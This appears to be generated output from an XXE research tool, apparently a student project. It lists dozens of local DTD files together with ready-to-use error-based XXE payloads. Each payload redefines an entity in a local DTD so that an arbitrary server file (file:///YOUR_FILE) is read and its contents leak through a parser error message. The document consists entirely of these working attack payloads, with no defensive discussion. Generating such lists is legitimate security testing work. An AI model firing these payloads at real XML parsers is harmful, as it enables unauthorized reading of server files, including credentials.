        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcreport-0.3.dtd`

**Injectable entity:** `hwpcreport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcreport-0.3.dtd">

    <!ENTITY % hwpcreport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcreport.dtd`

**Injectable entity:** `hwpcreport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcreport.dtd">

    <!ENTITY % hwpcreport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcprofilereport-0.3.dtd`

**Injectable entity:** `hwpcprofilereport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcprofilereport-0.3.dtd">

    <!ENTITY % hwpcprofilereport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcreport.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcreport.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/kate/language.dtd`

**Injectable entity:** `commonAttributes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/kate/language.dtd">

    <!ENTITY % commonAttributes '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/scrollkeeper-omf.dtd`

**Injectable entity:** `url.attribute.set`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/scrollkeeper-omf.dtd">

    <!ENTITY % url.attribute.set '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jsf/web-facesconfig_1_1.dtd`

**Injectable entity:** `Language`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jsf/web-facesconfig_1_1.dtd">

    <!ENTITY % Language '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `measure`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % measure '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `backrefs.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % backrefs.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `reference.atts`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % reference.atts '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `anonymous.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % anonymous.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `auto.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % auto.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `fixedspace.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % fixedspace.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `align-h.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % align-h.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `align-hv.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % align-hv.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `bibliographic.elements`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % bibliographic.elements 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `structure.model`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % structure.model 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `text.model`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % text.model '(aa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd`

**Injectable entity:** `calstblx`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/docutils.dtd">

    <!ENTITY % calstblx '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `CIMName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % CIMName '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `CIMType`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % CIMType '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `QualifierFlavor`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % QualifierFlavor '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `ClassOrigin`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % ClassOrigin '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `Propagated`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % Propagated '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `ArraySize`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % ArraySize '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `SuperClass`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % ClassName '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd`

**Injectable entity:** `ReferenceClass`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/cim20.dtd">

    <!ENTITY % ReferenceClass '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/openoffice/libraries.dtd`

**Injectable entity:** `boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/openoffice/libraries.dtd">

    <!ENTITY % boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/openoffice/office.dtd`

**Injectable entity:** `dtypes-mod`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/openoffice/office.dtd">

    <!ENTITY % dtypes-mod '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/fonts.dtd`

**Injectable entity:** `constant`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/fonts.dtd">

    <!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/fonts.dtd`

**Injectable entity:** `expr`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/fonts.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/libgda/libgda-server-operation.dtd`

**Injectable entity:** `paramlist-dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/libgda/libgda-server-operation.dtd">

    <!ENTITY % paramlist-dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/libgda/libgda-paramlist.dtd`

**Injectable entity:** `array-dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/libgda/libgda-paramlist.dtd">

    <!ENTITY % array-dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/sip-app_1_0.dtd`

**Injectable entity:** `condition`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/sip-app_1_0.dtd">

    <!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/servlet-api/XMLSchema.dtd`

**Injectable entity:** `xs-datatypes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/servlet-api/XMLSchema.dtd">

    <!ENTITY % xs-datatypes '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `boost.common.attrib`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % boost.common.attrib '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `boost.namespace.mix`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % boost.namespace.mix 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `boost.template.mix`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % boost.template.mix 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `boost.class.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % boost.class.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `boost.class-specialization.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % boost.class-specialization.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

